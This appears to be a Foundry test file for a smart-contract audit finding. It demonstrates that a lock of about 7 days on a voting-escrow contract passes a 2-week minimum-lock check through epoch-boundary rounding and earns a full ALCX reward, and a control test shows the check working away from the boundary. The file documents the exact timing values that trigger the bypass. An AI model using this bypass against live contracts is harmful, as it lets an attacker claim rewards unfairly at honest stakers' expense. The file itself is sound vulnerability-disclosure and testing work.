// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";
import "./38178-bpt-can-be-locked-for-only-1-week-resulting-in-unfair-alcx-r.sol";

contract MinLockCheckBypassTest is Test {
    uint256 constant NEXT_EPOCH_START = 1717632000;

    /// @notice HARM: run() proves Bob's ~7-day lock passes the "must lock
    ///         >= 1 epoch (2 weeks)" check and earns the same flat reward as
    ///         Alice's honest, full 2-week lock.
    function test_exploit_shortLockEarnsFullReward() public {
        Exploit e = new Exploit();
        e.run();

        assertLt(e.ve().lockDuration(e.bobTokenId()), e.ve().EPOCH(), "Bob's lock duration is below the minimum epoch");
        assertEq(e.alcx().balanceOf(e.BOB()), e.alcx().balanceOf(e.ALICE()), "Bob receives the same reward as Alice");
        assertEq(e.alcx().balanceOf(e.BOB()), 1000 ether);
    }

    /// @notice Isolates the exact boundary math from the finding: a lock
    ///         started 7 days + 1 second before the epoch boundary, for a
    ///         duration of only 7 days + 1 second, still passes the "must
    ///         lock >= 1 epoch" check.
    function test_checkPasses_forSubMinimumDuration() public {
        VotingEscrow ve = new VotingEscrow();
        uint256 nowTs = NEXT_EPOCH_START - (7 days + 1 seconds);
        uint256 dur = 7 days + 1 seconds;

        uint256 tokenId = ve.createLock(1e18, dur, nowTs); // must NOT revert
        assertEq(ve.unlockTimeOf(tokenId), NEXT_EPOCH_START, "unlock time lands exactly on the epoch boundary");
        assertLt(dur, ve.EPOCH(), "the actual duration used is below the minimum epoch");
    }

    /// @notice Control: a lock attempted with a duration well short of 1
    ///         epoch, started well BEFORE the boundary-approach window
    ///         (e.g. exactly at the epoch start with only a 1-day duration),
    ///         correctly reverts -- isolating that the bug is specifically
    ///         about the boundary-rounding interaction, not "the check never
    ///         works".
    function test_control_shortLockFarFromBoundaryReverts() public {
        VotingEscrow ve = new VotingEscrow();
        uint256 nowTs = NEXT_EPOCH_START - 2 weeks; // far from the boundary
        uint256 dur = 1 days; // far short of the 2-week minimum

        vm.expectRevert("Voting lock must be 1 epoch");
        ve.createLock(1e18, dur, nowTs);
    }
}
